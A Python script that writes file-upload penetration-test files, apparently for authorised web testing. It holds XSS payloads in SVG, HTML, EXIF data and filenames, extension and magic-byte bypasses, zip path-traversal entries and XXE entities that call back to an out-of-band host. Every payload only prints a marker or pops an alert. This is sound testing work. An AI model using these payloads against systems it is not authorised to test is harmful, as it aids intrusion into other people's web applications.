#!/usr/bin/env python3
"""Generate harmless file-upload test files (no network).

Every file proves behavior with a unique marker or arithmetic, never with a
shell, command execution, or file reads:
  - script-extension files print MARKER and 7*7 only (execution = authorized-only follow-up)
  - SVG/HTML files call alert(document.domain)
  - XXE files reference only your own OOB host (--oob), and are skipped without it
  - archives contain a single marker text file with a traversal path
No zip bombs are generated.

Example:
  upload_testfiles.py --out artifacts/example.com/upload_tests --marker fu7k2q --oob abc123.oast.example
"""
from __future__ import annotations

import argparse
import io
import os
import secrets
import struct
import sys
import zipfile

GIF_1x1 = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00"
           b",\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
PNG_SIG = b"\x89PNG\r\n\x1a\n"
JPEG_MIN_TAIL = (  # minimal baseline JPEG body after SOI (1x1 grey), used to build a valid image
    b"\xff\xdb\x00C\x00" + bytes([8] * 64) +
    b"\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"
    b"\xff\xc4\x00\x14\x00\x01" + b"\x00" * 15 + b"\x00"
    b"\xff\xc4\x00\x14\x10\x01" + b"\x00" * 15 + b"\x00"
    b"\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xd2\xcf \xff\xd9"
)


def jpeg_with_comment(comment: str) -> bytes:
    data = comment.encode()
    seg = b"\xff\xfe" + struct.pack(">H", len(data) + 2) + data
    return b"\xff\xd8" + seg + JPEG_MIN_TAIL


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--marker", default="fu" + secrets.token_hex(4))
    ap.add_argument("--oob", help="your own out-of-band host for XXE files")
    args = ap.parse_args()
    m = args.marker
    os.makedirs(args.out, exist_ok=True)
    files: dict[str, tuple[bytes, str, str]] = {}

    php = f"<?php echo 'MARKER_{m}_'.(7*7); ?>\n".encode()
    asp = f"<% Response.Write(\"MARKER_{m}_\" & (7*7)) %>\n".encode()
    jsp = f"<%= \"MARKER_{m}_\" + (7*7) %>\n".encode()
    text = f"MARKER_{m} harmless upload test file\n".encode()
    html = f"<!doctype html><title>{m}</title><p>MARKER_{m}</p><script>alert(document.domain)</script>\n".encode()
    svg_xss = (f'<?xml version="1.0" standalone="no"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
               f'<text x="0" y="10">MARKER_{m}</text><script>alert(document.domain)</script></svg>\n').encode()

    files["marker.txt"] = (text, "text/plain", "FU-001 baseline")
    files["marker.html"] = (html, "text/html", "FU-009")
    files["svg_xss.svg"] = (svg_xss, "image/svg+xml", "FU-008")
    files["marker.php.jpg"] = (php, "image/jpeg", "FU-004 double extension (execution check is authorized-only)")
    files["marker.jsp.png"] = (jsp, "image/png", "FU-004")
    files["marker.asp;.jpg"] = (asp, "image/jpeg", "FU-003/FU-004 IIS semicolon")
    for ext in ("php5", "phtml", "phar", "pht", "pgif", "inc"):
        files[f"marker.{ext}"] = (php, "application/octet-stream", "FU-002 uncommon PHP extension")
    for ext in ("aspx", "cer", "asa", "ashx"):
        files[f"marker.{ext}"] = (asp, "application/octet-stream", "FU-002 uncommon ASP extension")
    for ext in ("jspx", "jspf"):
        files[f"marker.{ext}"] = (jsp, "application/octet-stream", "FU-002 uncommon JSP extension")
    files["marker.pHp"] = (php, "application/octet-stream", "FU-003 case")
    files["magic_gif.php"] = (b"GIF89a;\n" + php, "image/gif", "FU-007 magic bytes")
    files["magic_png.html"] = (PNG_SIG + b"\n" + html, "image/png", "FU-007")
    files["magic_jpg.svg"] = (b"\xff\xd8\xff\xe0\n" + svg_xss, "image/jpeg", "FU-007")
    files["polyglot.gif"] = (GIF_1x1 + b"\n<!-- MARKER_" + m.encode() + b" --><script>alert(document.domain)</script>\n",
                             "image/gif", "FU-013 GIF + HTML")
    files["exif_xss.jpg"] = (jpeg_with_comment(f'"><img src=x onerror=alert(document.domain)>MARKER_{m}'),
                             "image/jpeg", "FU-016 JPEG comment marker")
    files["xss_name_test.jpg"] = (jpeg_with_comment(f"MARKER_{m}"), "image/jpeg",
                                  'FU-005/UP-005: upload with filename "><img src=x onerror=alert(document.domain)>.jpg')

    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr(f"../zipslip_{m}.txt", text)
        z.writestr(f"..\\zipslip_win_{m}.txt", text)
        z.writestr(f"ok_{m}.txt", text)
    files["zipslip.zip"] = (zbuf.getvalue(), "application/zip", "FU-019 traversal entries (marker text only)")

    if args.oob:
        oob = args.oob
        svg_xxe = (f'<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY % x SYSTEM "http://{oob}/fu020-{m}"> %x;]>\n'
                   f'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><text y="10">MARKER_{m}</text></svg>\n').encode()
        files["svg_xxe.svg"] = (svg_xxe, "image/svg+xml", "FU-020 OOB entity to your host only")
        xml = (f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % x SYSTEM "http://{oob}/fu020x-{m}"> %x;]>\n<r>MARKER_{m}</r>\n').encode()
        files["xxe.xml"] = (xml, "application/xml", "FU-020")

    manifest = ["# Upload test files", "", f"Marker: `MARKER_{m}`", "",
                "| File | Send as Content-Type | Check |", "|---|---|---|"]
    for name, (data, ctype, note) in files.items():
        safe = name.replace(";", "_semicolon_")  # ';' kept in the manifest; on disk replaced for portability
        with open(os.path.join(args.out, safe), "wb") as fh:
            fh.write(data)
        manifest.append(f"| `{name}` (disk: `{safe}`) | `{ctype}` | {note} |")
    manifest += [
        "",
        "## Filename variants to send in the multipart `filename=` (cannot be created on disk)",
        "",
        f"- `marker.php%00.jpg`, `marker.php\\x00.jpg` (FU-005)",
        f"- `marker.php.`, `marker.php%20`, `marker.php/`, `marker.php::$DATA`, `marker.php%0a` (FU-003)",
        f"- `../marker_{m}.txt`, `..%2fmarker_{m}.txt`, `..\\\\marker_{m}.txt` (FU-011)",
        "- `\"><img src=x onerror=alert(document.domain)>.jpg` (UP-005)",
        "",
        "Delete every uploaded test file after the test and record its path.",
    ]
    open(os.path.join(args.out, "MANIFEST.md"), "w", encoding="utf-8").write("\n".join(manifest) + "\n")
    print(f"wrote {len(files)} files and MANIFEST.md to {args.out} (marker MARKER_{m})")
    if not args.oob:
        print("XXE files skipped: pass --oob <your host> to generate them")
    return 0


if __name__ == "__main__":
    sys.exit(main())
